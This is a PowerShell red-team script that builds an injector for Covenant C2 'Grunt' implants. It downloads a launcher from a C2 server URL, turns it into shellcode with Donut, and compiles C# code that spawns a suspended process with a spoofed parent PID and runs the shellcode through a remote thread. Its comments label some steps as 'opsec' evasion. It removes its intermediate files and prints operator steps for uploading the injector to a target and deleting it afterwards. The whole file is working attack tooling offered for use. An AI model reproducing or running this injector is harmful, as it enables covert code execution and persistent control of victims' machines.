﻿# Title: Generate-GruntInjector.ps1
# Author: Hunter Friday (tgihf)
# Intent: Given the URL to a Binary Launcher hosted on a Covenant server, produce
#         a program that will inject the binary launcher into an arbitrary process
#         with an arbitrary PPID. Uses Rasta Mouse's Donut technique from 
#         https://rastamouse.me/2019/08/covenant-donut-tikitorch/
# Dependencies: Donut (https://github.com/TheWover/donut), installed in the current directory

# Command line arguments
param(
    [Parameter(Mandatory = $true)]
    [string]
    $LauncherURL,

    [Parameter(Mandatory = $false)]
    [string]
    $DonutPath = "donut"
)

# Variables
$wd = (Get-Location).Path
$LauncherExePath = "GruntLauncher.exe"
$InjectorShellcodePath = "GruntInjector.bin"
$GruntInjectorSourcePath = "GruntInjector.cs"
$cscPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

# Download binary Grunt launcher from Covenant server
$launcherBinary = (New-Object Net.WebClient).DownloadString($LauncherURL)

# Write to disk
Set-Content -Path $launcherExePath -Value $launcherBinary

# Use Donut to translate the binary launcher on disk into shellcode
Invoke-Expression -Command "& '$DonutPath' $LauncherExePath -o $InjectorShellcodePath" | Out-Null

# Base 64 encode shellcode
$base64Shellcode = ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$InjectorShellcodePath")))

# Insert base 64 encoded shellcode into GruntInjector.cs
$GruntInjectorSource = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace GruntInjection
{
    class Program
    {
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;
        public const uint ExtendedStartupInfoPresent = 0x00080000;
        public const int ProcThreadAttributeParentProcess = 0x00020000;

        // Hardcoded Grunt Stage
        public static byte[] gruntStager = Convert.FromBase64String("$base64Shellcode");

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.Error.WriteLine("Invalid number of args");
                return;
            }

            // Create new process
            PROCESS_INFORMATION pInfo = CreateTargetProcess(args[0], int.Parse(args[1]));

            // Allocate memory (RW for opsec)
            IntPtr allocatedRegion = VirtualAllocEx(pInfo.hProcess, IntPtr.Zero, (uint)gruntStager.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);

            // Copy Grunt PIC to new process
            UIntPtr bytesWritten;
            WriteProcessMemory(pInfo.hProcess, allocatedRegion, gruntStager, (uint)gruntStager.Length, out bytesWritten);

            // Change memory region to RX (opsec)
            MemoryProtection oldProtect;
            VirtualProtectEx(pInfo.hProcess, allocatedRegion, (uint)gruntStager.Length, MemoryProtection.ExecuteRead, out oldProtect);

            // Create new thread
            CreateRemoteThread(pInfo.hProcess, IntPtr.Zero, 0, allocatedRegion, IntPtr.Zero, 0, IntPtr.Zero);
        }

        public static PROCESS_INFORMATION CreateTargetProcess(string targetProcess, int parentProcessId)
        {
            STARTUPINFOEX sInfo = new STARTUPINFOEX();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            sInfo.StartupInfo.cb = (uint)Marshal.SizeOf(sInfo);
            IntPtr lpValue = IntPtr.Zero;

            try
            {
                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                uint flags = CreateSuspended | DetachedProcess | CreateNoWindow | ExtendedStartupInfoPresent;

                IntPtr lpSize = IntPtr.Zero;

                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                sInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, ref lpSize);

                IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfo, out pInfo);

                return pInfo;

            }
            finally
            {
                DeleteProcThreadAttributeList(sInfo.lpAttributeList);
                Marshal.FreeHGlobal(sInfo.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }
        }

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }
    }
}
"@

# Write injector source code to disk
Set-Content -Path $GruntInjectorSourcePath -Value $GruntInjectorSource

# Compile injector source code file with CSC V4
Invoke-Expression -Command "$CscPath $GruntInjectorSourcePath" | Out-Null

# Clean up launcher binary, shellcode, and injector source code
Remove-Item -Path $LauncherExePath
Remove-Item -Path $InjectorShellcodePath
Remove-Item -Path $GruntInjectorSourcePath

# Notify the operator 
Write-Host "[*] GruntInjector.exe generated"
Write-Host "`n[**] UPLOAD"
Write-Host "[**] Covenant -> Grunts -> <choose grunt> -> Tasks -> Upload"
Write-Host "[**] FilePath: <path to upload file to on target machine"
Write-Host "[**] FileContents: <browse to file to upload>"
Write-Host "`n[***] INJECT"
Write-Host "[***] Covenant -> Grunts -> <choose grunt> -> Interact"
Write-Host "[***] shell <path to injector on target> <full path of exe to impersonate> <PPID>"
Write-Host "`n[****] CLEAN UP"
Write-Host "[****] Covenant -> Grunts -> <choose grunt> -> Interact"
Write-Host "[****] shell del <path to injector on target>"

#>